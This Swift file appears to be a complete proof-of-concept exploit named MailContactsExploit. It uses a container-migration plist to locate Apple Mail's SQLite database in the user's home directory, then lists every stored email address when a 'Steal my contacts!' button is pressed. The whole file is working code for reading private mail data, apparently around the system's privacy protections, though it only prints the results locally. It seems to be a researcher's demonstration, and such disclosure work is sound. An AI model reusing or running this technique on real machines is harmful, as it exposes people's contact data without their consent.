//
//  ContentView.swift
//  MailContactsExploit
//
//  Created by Pedro José Pereira Vieito on 12/3/24.
//

import SwiftUI
import SQLite

struct ContentView: SwiftUI.View {
    var body: some SwiftUI.View {
        VStack {
            Button {
                Task {
                    let containerMigrationPlistURL = Bundle.main.url(forResource: "container-migration", withExtension: "plist")!
                    let containerMigrationPlistData = try! Data(contentsOf: containerMigrationPlistURL)
                    let containerMigrationPlist = try! PropertyListSerialization.propertyList(from: containerMigrationPlistData, format: nil) as! [String: [String]]
                    let itemPath = containerMigrationPlist["Move"]!.first!.replacingOccurrences(of: "${Home}/", with: "")
                    let mailDatabase = FileManager.default.homeDirectoryForCurrentUser.appendingPathComponent(itemPath)
                    
                    do {
                        print("[!] Loading Mail database at “\(mailDatabase.path)”)…")
                        let db = try Connection(mailDatabase.path)
                        
                        let query =  """
                            SELECT DISTINCT address
                            FROM addresses
                            ORDER BY 1
                            """
                        for row in try db.prepare(query) {
                            print("[*] \(row[0] ?? "--")")
                        }
                    }
                    catch {
                        print("[x] \(error.localizedDescription)")
                    }
                }
            } label: {
                Image(systemName: "globe")
                    .imageScale(.large)
                    .foregroundStyle(.tint)
                Text("Steal my contacts!")
            }
        }
        .padding()
    }
}

#Preview {
    ContentView()
}
